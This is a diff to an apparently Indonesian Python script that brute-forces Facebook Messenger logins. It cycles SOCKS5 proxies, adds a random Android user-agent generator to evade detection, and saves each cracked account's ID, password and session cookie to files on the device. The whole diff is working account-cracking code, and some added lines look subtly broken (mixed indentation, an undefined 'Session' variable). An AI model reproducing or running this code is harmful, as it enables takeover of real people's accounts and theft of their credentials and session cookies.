@@ -214,6 +214,17 @@ bln = dic[(str(datetime.now().month))]
 thn = datetime.now().year
 okc = 'PAL-OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 cpc = 'PAL-CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+def ____PO_CO____():
+    version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
+    model_choices = ['SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F']
+    build_choices = ['MMB29Q', 'R16NW', 'LRX22C', 'R16NW', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T']
+    version = random.choice(version_choices)
+    model = random.choice(model_choices)
+    build = random.choice(build_choices)
+    ver = str(random.choice(range(77, 577))) # Corrected range
+    ver2 = str(random.choice(range(57, 77))) # Corrected range
+    return (f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) '
+            f'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36')
 #========= TAHUN ========#			
 def tahun(fx):
 	if len(fx)==15:
@@ -547,26 +558,28 @@ def crackasync(idf,pwv):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			headers = {
-             "Host": "www.messenger.com",
-             "Connection": "keep-alive",
-             "Content-Length": "267",
-             "Cache-Control": "max-age=0",
-             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
-             "sec-ch-ua-mobile": "?0",
-             "sec-ch-ua-platform": '"Linux"',
-             "Upgrade-Insecure-Requests": "1",
-             "Origin": "https://www.messenger.com",
-             "Content-Type": "application/x-www-form-urlencoded",
-             "User-Agent": ua2,
-             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-             "Sec-Fetch-Site": "same-origin",
-             "Sec-Fetch-Mode": "navigate",
-             "Sec-Fetch-User": "?1",
-             "Sec-Fetch-Dest": "document",
-             "Referer": "https://www.messenger.com/",
-             "Accept-Encoding": "gzip, deflate, br",
-             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
-			}
+            'Host': 'www.messenger.com',
+            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
+            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
+            'x-response-format': 'JSONStream',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
+            'viewport-width': '360',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-asbd-id': '129477',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua-platform': '"Android"',
+            'accept': '*/*',
+            'origin': 'https://www.messenger.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://www.messenger.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
 			reqs = ses.get("https://www.messenger.com/").text
 			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
 			data = {
@@ -593,14 +606,17 @@ def crackasync(idf,pwv):
 			if 'c_user' in ses.cookies.get_dict():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f"{m}══════════════════════════════════════════════════")
-				print(f'\r{h}[OK BOLO] 😍 {u}{idf} | {u}{pw}{x}\n')
-				print(f"{m}══════════════════════════════════════════════════")
-				print(f'{k}Cookie == {h}{kuki}{x}')
-				print(f"{m}══════════════════════════════════════════════════")
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-				break
+				cok = Session.cookies.get_dict()
+                idf = cok["c_user"]
+				ckk = f'https://graph.facebook.com/{idf}/picture?type=normal'
+				res = requests.get(ckk).text
+				if 'Photoshop' in res:
+				    print(f'\r{h}[CRACK-OK]😍{u}{idf}|{u}{pw}{x}\n')
+				    print(f"{m}══════════════════════════════════════════════════")
+				    print(f'{k}Cookie - {h}{kuki}{x}')
+				    print(f"{m}══════════════════════════════════════════════════")
+				    open("/sdcard/CRACK2/CRACK-COOKIE-OK.txt","a").write(idf+"|"+pw+"|"+kuki+"\n")
+				    break
 			elif "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
